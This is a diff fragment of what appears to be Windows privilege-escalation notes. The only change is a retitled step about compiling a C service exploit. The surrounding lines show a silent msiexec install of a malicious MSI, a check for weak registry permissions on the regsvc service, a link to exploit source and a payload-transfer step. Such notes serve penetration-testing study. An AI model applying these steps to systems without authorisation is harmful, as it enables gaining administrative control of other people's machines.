@@ -513,7 +513,7 @@ msiexec /quiet /qn /i C:\Temp\badsetup.msi
 1. Confirm vulnerable regkey by checking Privilges of regsvc. (“NT AUTHORITY\INTERACTIVE” “FullContol”)  
 Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
 
-2. Compiling your C program  
+2. Compiling your windows service exploit written in C.   
 https://github.com/sagishahar/scripts/blob/master/windows_service.c  
 
 3. Transfer your payload to your windows box  
